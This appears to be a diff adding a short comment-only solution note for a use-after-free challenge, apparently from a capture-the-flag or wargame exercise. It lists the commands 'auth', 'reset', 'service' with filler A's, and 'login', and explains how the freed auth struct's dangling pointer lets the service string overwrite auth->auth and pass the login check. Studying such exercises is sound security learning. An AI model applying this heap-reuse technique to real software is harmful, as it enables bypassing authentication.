@@ -1,0 +1,12 @@
+# Free after use exploit.
+# Launch the binary
+# auth admin
+# The struct auth will be allocated with malloc
+# reset
+# The reset will free the auth struct but will not set the pointer at NULL
+# service AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# service will be the same pointer as auth
+# login
+# login will check the auth->auth value, auth is free but the pointer is still here and service has the same pointer
+# The AAAAAAAAAAAAAAAAAA string will be at he same position as auth->auth so when the program check the auth->auth value it will not be NULL
+# GG
